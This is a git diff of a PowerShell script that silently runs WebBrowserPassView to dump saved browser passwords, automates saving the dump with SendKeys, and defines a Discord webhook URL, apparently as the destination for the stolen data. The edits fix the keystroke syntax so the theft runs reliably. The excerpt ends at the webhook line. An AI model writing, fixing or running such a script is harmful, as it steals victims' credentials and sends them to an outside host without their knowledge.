@@ -10,11 +10,10 @@ Expand-Archive 7z.zip
 Start-Sleep -Seconds 5
 Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
 
-$WShell = New-Object -com wscript.shell
-$Wshell.AppActivate('WebBrowserPassView')
-$WShell.sendkeys("{^}a")
+$WShell = New-Object -com "Wscript.Shell"
+$WShell.sendkeys("^a")
 Start-Sleep -Seconds 2
-$WShell.sendkeys("{^}s")
+$WShell.sendkeys("^s")
 Start-Sleep -Seconds 2
 $WShell.sendkeys("j")
 Start-Sleep -Seconds 2
@@ -22,7 +21,7 @@ $WShell.sendkeys("j")
 Start-Sleep -Seconds 1
 $WShell.sendkeys("{ENTER}")
 Start-Sleep -Seconds 2
-$WShell.sendkeys("{%}{F4}")
+$WShell.sendkeys("%{F4}")
 Start-Sleep -Seconds 2
 
 $hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
